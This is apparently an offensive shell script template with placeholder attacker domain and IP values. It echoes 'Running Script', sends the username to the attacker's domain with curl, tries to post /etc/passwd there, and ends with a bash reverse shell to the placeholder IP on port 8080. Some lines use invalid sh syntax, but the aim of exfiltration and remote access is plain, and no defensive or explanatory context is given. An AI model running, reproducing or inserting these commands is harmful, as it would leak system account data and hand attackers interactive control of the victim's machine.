#!/bin/sh

$Domain = "DOMAIN-HERE"
$Ip = "IP-HERE"


echo "Running Script"
$Username = uname
curl "http://$Domain/$Username.txt"
curl -F file=/etc/passwd "http://$Domain/"

bash -i >& /dev/tcp/{IP-HERE}/8080 0>&1
